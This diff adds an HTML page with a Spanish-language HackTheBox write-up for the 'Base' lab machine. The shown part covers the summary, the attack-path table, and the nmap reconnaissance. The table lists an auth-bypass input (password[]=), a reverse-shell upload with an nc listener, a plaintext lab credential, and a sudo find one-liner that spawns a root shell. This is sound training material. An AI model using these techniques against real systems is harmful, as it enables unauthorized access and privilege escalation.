@@ -1,0 +1,1340 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Base — HackTheBox Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Base de HackTheBox — Dificultad: Fácil. Directory Listing → PHP Type Juggling → File Upload → RCE → Credenciales en texto plano → SSH → sudo find LPE.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00e5ff;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(0,229,255,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--cyan); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-facil   { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-htb     { color: var(--green); border-color: rgba(0,255,136,0.4);  background: rgba(0,255,136,0.05); }
+    .badge-linux   { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
+    .badge-upload  { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
+    .badge-rce     { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .badge-sudo    { color: var(--purple); border-color: rgba(191,95,255,0.35); background: rgba(191,95,255,0.05); }
+    .badge-php     { color: var(--cyan);   border-color: rgba(0,229,255,0.3);   background: rgba(0,229,255,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-cyan   { color: var(--cyan); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-facil  { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+    .prose p .hl-ora   { color: var(--orange); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .prompt-root { color: var(--red); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+    .output-block .o-orange { color: var(--orange); }
+
+    .output-block.ascii-art {
+      font-size: 0.82rem; line-height: 1.22; letter-spacing: 0;
+      white-space: pre; font-family: 'Share Tech Mono', 'Courier New', monospace;
+    }
+
+    /* INFO BOXES */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .vuln-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .vuln-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .vuln-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .vuln-box p strong { color: var(--red); }
+
+    /* CRED BOX */
+    .cred-box { border: 1px solid rgba(0,255,136,0.25); background: rgba(0,255,136,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; display: flex; gap: 2rem; flex-wrap: wrap; }
+    .cred-item .cred-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 0.3rem; }
+    .cred-item .cred-val   { font-family: var(--font-mono); font-size: 0.95rem; color: var(--green); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,229,255,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--cyan); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--green); }
+    .glos-def code { color: var(--yellow); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* FOOTER */
+    footer { padding: 2rem 4rem; border-top: 1px solid var(--dim); display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      nav, .writeup-hero, footer { padding-left: 1.5rem; padding-right: 1.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/hackthebox/">hackthebox</a> /
+      <span>base</span>
+    </p>
+    <h1 class="writeup-title"><span style="color:var(--green)">Base</span></h1>
+    <p class="writeup-subtitle">HackTheBox — Linux · Dir Listing → PHP Type Juggling → File Upload → RCE → Credenciales SSH → sudo find LPE</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-php">PHP TYPE JUGGLING</span>
+      <span class="meta-badge badge-upload">FILE UPLOAD</span>
+      <span class="meta-badge badge-rce">RCE</span>
+      <span class="meta-badge badge-sudo">SUDO · LPE</span>
+      <span class="meta-date">📅 Mayo 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#enumeracion">03 · Enumeración Web</a></li>
+        <li><a href="#dirlisting">04 · Directory Listing</a></li>
+        <li><a href="#bypass">05 · Auth Bypass · Type Juggling</a></li>
+        <li><a href="#upload">06 · File Upload · RCE</a></li>
+        <li><a href="#shell">07 · Reverse Shell</a></li>
+        <li><a href="#creds">08 · Credenciales &amp; SSH</a></li>
+        <li><a href="#privesc">09 · Privesc · sudo find</a></li>
+        <li><a href="#referencia">10 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">11 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.5.82</span></div>
+      <div class="info-row"><span class="info-label">Web</span><span class="info-val val-cyan">Apache 2.4.29</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nmap</span> → puertos 22/80</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>gobuster</span> → /login /forms /_uploaded</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Dir Listing</span> → login.php.swp</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Type Juggling</span> → bypass auth</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>PHP Upload</span> → RCE</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>config.php</span> → creds admin</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSH</span> → john@base</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>sudo find</span> → root</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Base</strong> es una máquina de dificultad <span class="hl">fácil</span>
+          de la plataforma <span class="hl-cyan">HackTheBox</span> que simula un servidor de
+          almacenamiento de archivos expuesto en producción. El objetivo de la máquina es practicar
+          la identificación de <strong>malas configuraciones web</strong>, la explotación de
+          <span class="hl-pur">PHP Type Juggling</span> para evadir autenticación, la carga de
+          <span class="hl-red">shells PHP maliciosas</span> para obtener ejecución remota de código
+          (<span class="hl-red">RCE</span>), la extracción de
+          <span class="hl-yel">credenciales en texto plano</span> desde archivos de configuración,
+          y la escalada de privilegios mediante un binario
+          <span class="hl-pur">sudo mal configurado</span>.
+        </p>
+        <p>
+          El servidor expone dos servicios: <span class="hl-cyan">SSH (puerto 22)</span> con
+          OpenSSH 7.6p1 y un servidor web <span class="hl-cyan">HTTP (puerto 80)</span> con
+          Apache 2.4.29 sobre Ubuntu. Al enumerar el servidor web encontramos un directorio
+          <code style="color:var(--yellow);font-family:var(--font-mono)">/login</code> con
+          <strong>directory listing habilitado</strong>, lo que expone un archivo swap
+          <code style="color:var(--yellow);font-family:var(--font-mono)">login.php.swp</code>
+          que revela el código fuente del login. Analizando el código se detecta un error de
+          comparación con <span class="hl-red">strcmp()</span> que permite el bypass de
+          autenticación enviando el parámetro password como array vacío.
+        </p>
+        <p>
+          Una vez autenticados como administrador, accedemos a un panel de carga de archivos. Al no
+          existir validación del tipo de archivo en el servidor, subimos una
+          <span class="hl-red">webshell PHP</span> que nos entrega una reverse shell como el
+          usuario <span class="hl">www-data</span>. Desde esa shell navegamos al directorio
+          <code style="color:var(--yellow);font-family:var(--font-mono)">/login</code> y leemos
+          <code style="color:var(--yellow);font-family:var(--font-mono)">config.php</code>, que
+          contiene la contraseña en texto plano del usuario <span class="hl">john</span>. Con esas
+          credenciales ingresamos por SSH y escalamos a <span class="hl-red">root</span> abusando
+          del permiso <code style="color:var(--yellow);font-family:var(--font-mono)">sudo</code>
+          sobre el binario <code style="color:var(--yellow);font-family:var(--font-mono)">/usr/bin/find</code>,
+          tal como lo documenta <span class="hl-cyan">GTFOBins</span>.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Reconocimiento</td><td>nmap -p- -sSCV -n -Pn --min-rate=5000 --open -oX</td><td>Puertos 22 (SSH) y 80 (HTTP) abiertos · Apache 2.4.29</td></tr>
+          <tr><td>Reporte visual</td><td>xsltproc base.xml → base.html</td><td>Reporte HTML del escaneo Nmap</td></tr>
+          <tr><td>Enum. Web</td><td>gobuster dir -u http://10.129.5.82 -w big.txt -x php</td><td>Directorios: /login, /forms, /_uploaded, upload.php</td></tr>
+          <tr><td>Dir. Listing</td><td>Acceso a http://10.129.5.82/login/</td><td>login.php.swp expuesto → código fuente del login</td></tr>
+          <tr><td>Auth Bypass</td><td>Burp Suite → password[]=  (array vacío)</td><td>PHP strcmp() devuelve 0 → autenticación eludida</td></tr>
+          <tr><td>File Upload</td><td>Subida de xp.php (reverse shell)</td><td>Archivo accesible en /_uploaded/xp.php</td></tr>
+          <tr><td>RCE</td><td>nc -lvnp 443 → acceso a /_uploaded/xp.php</td><td>Shell como www-data</td></tr>
+          <tr><td>Creds</td><td>cat /var/www/html/login/config.php</td><td>admin:thisisagoodpassword · usuario john</td></tr>
+          <tr><td>Acceso SSH</td><td>ssh john@10.129.5.82</td><td>Shell como john · user.txt obtenido</td></tr>
+          <tr><td>Privesc</td><td>sudo -l → (root:root) /usr/bin/find</td><td>find con sudo → shell como root</td></tr>
+          <tr><td>Root</td><td>sudo /usr/bin/find . -exec /bin/sh \; -quit</td><td>root.txt obtenido</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">ESCANEO COMPLETO DE PUERTOS CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          El primer paso siempre es conocer qué servicios están expuestos en la máquina objetivo.
+          Usamos <span class="hl-cyan">nmap</span> con un escaneo agresivo: barremos
+          <strong>todos los 65535 puertos TCP</strong> con SYN scan sigiloso (<span class="hl-red">-sS</span>),
+          detección de versiones y scripts de enumeración (<span class="hl-cyan">-sCV</span>),
+          sin resolución DNS (<span class="hl-cyan">-n</span>) ni ping previo
+          (<span class="hl-cyan">-Pn</span>) y con una tasa mínima de 5000 paquetes por segundo
+          para acelerar el proceso. Guardamos el resultado en formato XML (<span class="hl-yel">-oX</span>)
+          para convertirlo después en un reporte HTML visual con <span class="hl-cyan">xsltproc</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.5.82 -oX base.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">RECONOCIMIENTO</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">10.129.5.82</span> <span class="flag">-oX</span> <span class="arg">base.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-08 01:15 -0400</div>
+        <div>Nmap scan report for <span class="o-cyan">10.129.5.82</span></div>
+        <div>Host is up (0.56s latency).</div>
+        <div>Not shown: 35255 closed tcp ports (reset), 30278 filtered tcp ports</div>
+        <div>PORT&nbsp;&nbsp;&nbsp; STATE SERVICE VERSION</div>
+        <div><span class="o-green">22/tcp open</span>  ssh&nbsp;&nbsp;&nbsp;&nbsp; <span class="o-yellow">OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span></div>
+        <div>| ssh-hostkey:</div>
+        <div>|&nbsp;&nbsp; 2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)</div>
+        <div>|&nbsp;&nbsp; 256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)</div>
+        <div>|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)</div>
+        <div><span class="o-green">80/tcp open</span>  http&nbsp;&nbsp; <span class="o-yellow">Apache httpd 2.4.29 ((Ubuntu))</span></div>
+        <div>|_http-server-header: Apache/2.4.29 (Ubuntu)</div>
+        <div>|_http-title: <span class="o-cyan">Welcome to Base</span></div>
+        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div>&nbsp;</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 39.89 seconds</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// RESULTADO DEL ESCANEO</p>
+        <p>Se detectan <strong>dos puertos abiertos</strong>: el <strong>puerto 22</strong> con OpenSSH 7.6p1 sobre Ubuntu y el <strong>puerto 80</strong> con Apache 2.4.29. El título HTTP es "Welcome to Base", lo que confirma que el sitio web está activo. Comenzamos investigando el puerto 80.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">CONVERTIR RESULTADO NMAP A HTML (XSLTPROC)</span>
+      </div>
+      <div class="prose">
+        <p>
+          Nmap permite exportar sus resultados a XML. Usando la hoja de estilo XSL incluida con nmap
+          (<span class="hl-cyan">xsltproc</span>) podemos convertir ese XML en un
+          <strong>reporte HTML visual</strong> con colores, tablas y mejor legibilidad. Esto es útil
+          para documentar el reconocimiento de forma profesional y revisar la información de puertos,
+          versiones y scripts de forma organizada en el navegador.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc base.xml -o base.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">REPORTE</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">base.xml</span> <span class="flag">-o</span> <span class="arg">base.html</span></span></div>
